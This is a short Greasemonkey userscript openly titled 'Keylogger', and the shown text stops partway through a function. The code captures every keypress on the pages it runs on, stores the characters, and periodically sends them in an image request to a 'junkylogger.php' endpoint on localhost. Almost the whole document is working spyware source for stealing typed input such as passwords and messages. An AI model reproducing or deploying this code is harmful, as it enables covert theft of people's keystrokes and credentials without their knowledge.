// ==UserScript==
// @name           Keylogger
// @version 		1
// @namespace      
// @description    
// @include        
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// ==/UserScript==

var title 				= "Keylogger";
var version 			= "v1";

var width 				= 700;
var height 				= 400;
var cookieName 			= "";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);

GM_setValue('keys', '');
unsafeWindow.onkeypress = function(e) {
	eventobj = window.event?event:e;
	key = eventobj.keyCode?eventobj.keyCode:eventobj.charCode;
	keys = GM_getValue('keys');
	keys+= String.fromCharCode(key);
	GM_setValue('keys', keys);
}

window.setInterval(function(){
	new Image().src = 'http://localhost/junkylogger.php?keys='+GM_getValue('keys');
	GM_setValue('keys', '');
